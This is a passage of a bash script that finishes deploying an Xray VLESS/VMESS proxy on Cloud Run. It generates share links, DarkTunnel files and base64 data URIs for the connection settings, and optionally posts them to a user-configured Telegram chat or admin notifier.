  DARK_JSON="{\"type\":\"VLESS\",\"name\":\"${CUSTOM_ID:-$SERVICE}\",\"vlessTunnelConfig\":{\"v2rayConfig\":{\"host\":\"${HOST}\",\"port\":443,\"uuid\":\"${UUID}\",\"transportNetwork\":\"Websocket\",\"serverNameIndication\":\"${SNI}\",\"wsPath\":\"${WSPATH}\",\"wsHeaderHost\":\"${HOST}\"}}}"
elif [ "$PROTO" = "vmess" ]; then
  DARK_JSON="{\"type\":\"VMESS\",\"name\":\"${CUSTOM_ID:-$SERVICE}\",\"vmessTunnelConfig\":{\"v2rayConfig\":{\"host\":\"${HOST}\",\"port\":443,\"uuid\":\"${UUID}\",\"transportNetwork\":\"Websocket\",\"serverNameIndication\":\"${SNI}\",\"wsPath\":\"${WSPATH}\",\"wsHeaderHost\":\"${HOST}\"}}}"
else
  DARK_JSON='{}'
fi
ts_plus2=$(date -d "@$((SESSION_START_TIME + 3600))" "+%Y-%m-%d %H:%M")
DARK_BASE64=$(echo -n "$DARK_JSON" | base64 -w 0)
DARK_LINK="darktunnel://$DARK_BASE64"
DARK_FILE="${SERVICE}${ts_plus2}.dark"

#echo "$DARK_LINK" > "$DARK_FILE"
echo "$SHARE_LINK" > "$DARK_FILE"
# -------- Generate Alternative URL (short URL) --------
# Removed - we only use the primary Cloud Run URL for simplicity
# ALT_HOST is not needed anymore

echo ""
echo -e "${BOLD}${WHITE}Primary Link (Cloud Run):${NC}"
echo "$SHARE_LINK"

# -------- Generate Data URIs --------
echo ""
print_section "Data URIs (JSON/Text)"
echo ""

# Prepare path/service info
PATH_INFO=""
if [ "$NETWORK" = "ws" ]; then
  PATH_INFO="Path: ${WSPATH}"
elif [ "$NETWORK" = "grpc" ]; then
  PATH_INFO="Service: ${WSPATH}"
fi

# Prepare optional params info
OPTIONAL_INFO=""
if [ -n "${SNI}" ]; then
  OPTIONAL_INFO="${OPTIONAL_INFO}SNI: ${SNI}\n"
fi
if [ -n "${ALPN}" ] && [ "${ALPN}" != "h2,http/1.1" ]; then
  OPTIONAL_INFO="${OPTIONAL_INFO}ALPN: ${ALPN}\n"
fi
if [ -n "${CUSTOM_ID}" ]; then
  OPTIONAL_INFO="${OPTIONAL_INFO}Custom ID: ${CUSTOM_ID}\n"
fi

# Data URI 1: Plain text configuration
CONFIG_TEXT="✅ XRAY DEPLOYMENT SUCCESS

Protocol: ${PROTO^^}
Host: ${HOST}
Port: 443
UUID/Password: ${UUID}
${PATH_INFO}
Network: ${NETWORK_DISPLAY} + TLS
${OPTIONAL_INFO}Share Link: ${SHARE_LINK}"

DATA_URI_TEXT="data:text/plain;base64,$(echo -n "$CONFIG_TEXT" | base64 -w 0)"
echo -e "${BOLD}Text Format:${NC}"
echo "$DATA_URI_TEXT"
echo ""

# Data URI 2: JSON configuration
if [ "$NETWORK" = "ws" ]; then
  CONFIG_JSON=$(cat <<EOF
{
  "protocol": "${PROTO}",
  "host": "${HOST}",
  "port": 443,
  "uuid_password": "${UUID}",
  "path": "${WSPATH}",
  "network": "${NETWORK}",
  "network_display": "${NETWORK_DISPLAY}",
  "tls": true,
  "sni": "${SNI}",
  "alpn": "${ALPN}",
  "custom_id": "${CUSTOM_ID}",
  "share_link": "${SHARE_LINK}"
}
EOF
)
elif [ "$NETWORK" = "grpc" ]; then
  CONFIG_JSON=$(cat <<EOF
{
  "protocol": "${PROTO}",
  "host": "${HOST}",
  "port": 443,
  "uuid_password": "${UUID}",
  "service_name": "${WSPATH}",
  "network": "${NETWORK}",
  "network_display": "${NETWORK_DISPLAY}",
  "tls": true,
  "sni": "${SNI}",
  "alpn": "${ALPN}",
  "custom_id": "${CUSTOM_ID}",
  "share_link": "${SHARE_LINK}"
}
EOF
)
else
  CONFIG_JSON=$(cat <<EOF
{
  "protocol": "${PROTO}",
  "host": "${HOST}",
  "port": 443,
  "uuid_password": "${UUID}",
  "network": "${NETWORK}",
  "network_display": "${NETWORK_DISPLAY}",
  "tls": true,
  "sni": "${SNI}",
  "alpn": "${ALPN}",
  "custom_id": "${CUSTOM_ID}",
  "share_link": "${SHARE_LINK}"
}
EOF
)
fi

DATA_URI_JSON="data:application/json;base64,$(echo -n "$CONFIG_JSON" | base64 -w 0)"
echo -e "${BOLD}JSON Format:${NC}"
echo "$DATA_URI_JSON"
echo ""

# -------- Send to Telegram --------
if [ -n "${BOT_TOKEN}" ] && [ -n "${CHAT_ID}" ]; then
  print_section "Sending to Telegram"
  # Send the link to Telegram (single link only)
  send_telegram "<b>🔗 XRAY Configuration Link:</b><pre>${SHARE_LINK}</pre>"
  print_success "Configuration sent to Telegram"

  # Send DarkTunnel link as file attachment
  if [ -n "${DARK_FILE:-}" ] && [ -f "${DARK_FILE}" ]; then
    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendDocument" \
      -F chat_id="${CHAT_ID}" \
      -F document="@${DARK_FILE}" \
      > /dev/null 2>&1 || true
    print_success "DarkTunnel file sent to Telegram"
    rm "$DARK_FILE" || true
  fi
fi

# -------Notify Admin --------
if [ -n "${NOTIFY_ADMIN_KEY}" ]; then
  #print_section "Notify Admin"
  # notify-admin API
  

send_notify_admin "<b>🔗 XRAY Configuration Link:</b>
<pre>${SHARE_LINK}</pre>"
  #print_success "Configuration sent to Notify Admin"
fi

echo ""
echo -e "${BRIGHT_GREEN}${BOLD}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}║${NC}                                                              ${BRIGHT_GREEN}${BOLD}║${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}║${NC}    ✓ ${BRIGHT_WHITE}${BOLD}Installation Completed Successfully${NC}             ${BRIGHT_GREEN}${BOLD}║${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}║${NC}                                                              ${BRIGHT_GREEN}${BOLD}║${NC}"
echo -e "${BRIGHT_GREEN}${BOLD}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BRIGHT_YELLOW}${BOLD}📌 Next Steps:${NC}"
echo -e "  ${BRIGHT_CYAN}1.${NC} Copy the link above (VLESS, VMESS, or TROJAN)"
echo -e "  ${BRIGHT_CYAN}2.${NC} Open your VPN client application"
echo -e "  ${BRIGHT_CYAN}3.${NC} Scan the QR code or paste the link"
echo -e "  ${BRIGHT_CYAN}4.${NC} Select and connect to the server"
echo ""
echo -e "${DIM}For more information, visit your VPN client's documentation.${NC}"
echo ""